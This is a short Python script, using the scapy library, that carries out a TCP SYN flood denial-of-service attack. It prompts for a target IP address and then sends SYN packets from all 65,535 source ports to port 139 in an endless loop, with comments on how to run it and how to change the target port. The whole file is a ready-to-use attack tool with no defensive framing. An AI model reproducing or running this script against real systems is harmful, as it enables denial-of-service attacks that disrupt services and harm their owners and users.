import sys
from scapy.all import *

#####
# (TCP) SYN Flood
# Floods the target IP address with TCP SYN packets.
#
# This script sends TCP SYN packets from all ports of this machine to port 139 of the target IP.
# If you would like to target a port different than 139, modify the code below 'dport=139'.
#
# Author: Birkan Mert Erenler
#
# How To Run?
#   -> Open a command line, type 'python syn-flood.py TARGET_IP_ADDRESS'
#   -> Example: python syn-flood.py 1.1.1.1
#####

IP_input = raw_input("Please enter target IP address for SYN flood: ")
print "You entered: ", IP_input

while True:
    #TCP SYN (header flags: 0x02) packets from all TCP ports to port 139
	#(port 139 is vulnerable to SYN floods in some Windows XP machines)
	pkts = IP(dst=IP_input) / TCP(sport=(1,65535), dport=139, flags=0x02)
	sr(pkts)
